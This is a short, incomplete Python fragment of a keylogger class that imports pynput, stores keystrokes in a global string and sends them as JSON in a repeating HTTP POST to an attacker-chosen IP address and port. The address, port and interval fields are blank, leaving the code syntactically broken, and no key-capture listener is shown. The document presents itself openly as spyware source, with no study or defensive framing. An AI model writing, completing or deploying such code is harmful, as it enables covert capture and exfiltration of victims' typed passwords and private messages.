class KeyLogger:

    from pynput import keyboard

    import requests

    import json

    import threading


    # global variable text where keystrokes are saved as a string which is sent to server
    text = ""

    ip_address =    
    port_number = 
    time_interval = 

    def send_post_req():
        try:
            payload = json.dumps({"keyboardData": text})
            
            req = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type" : "application/json"})

            timer = threading.Timer(time_interval, send_post_req)

            timer.start()

        except:
            print("Couldn't complete request!")

